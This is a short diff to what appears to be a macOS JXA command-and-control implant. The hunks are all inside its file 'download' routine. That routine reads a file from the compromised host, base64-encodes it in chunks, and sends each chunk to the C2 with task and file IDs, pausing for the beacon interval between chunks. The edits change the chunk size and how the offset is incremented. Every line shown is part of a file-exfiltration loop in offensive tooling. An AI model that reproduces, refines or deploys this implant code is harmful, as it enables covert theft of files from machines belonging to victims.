@@ -511,7 +511,7 @@ sleepWakeUp = function(t){
                 // download just has one parameter of the path of the file to download
                 if( does_file_exist(params)){
                     var offset = 0;
-                    var chunkSize = 5000;
+                    var chunkSize = 3500;
                     var handle = $.NSFileHandle.fileHandleForReadingAtPath(params);
                     // Get the file size by seeking;
                     var fileSize = handle.seekToEndOfFile;
@@ -524,7 +524,6 @@ sleepWakeUp = function(t){
                         handle.seekToFileOffset(0);
                         var currentChunk = 1;
                         var data = handle.readDataOfLength(chunkSize);
-
                         while(data.length > 0 && offset < fileSize){
                             // send a chunk
                             var fileData = JSON.stringify({'chunk_num': currentChunk, 'chunk_data': data.base64EncodedStringWithOptions(0).js, 'task': task.id, 'file_id': registerFile['id']});
@@ -533,7 +532,7 @@ sleepWakeUp = function(t){
                             $.NSThread.sleepForTimeInterval(C2.interval);
 
                             // increment the offset and seek to the amount of data read from the file
-                            offset += data.length;
+                            offset += parseInt(data.length);
                             handle.seekToFileOffset(offset);
                             currentChunk += 1;
                             data = handle.readDataOfLength(chunkSize);
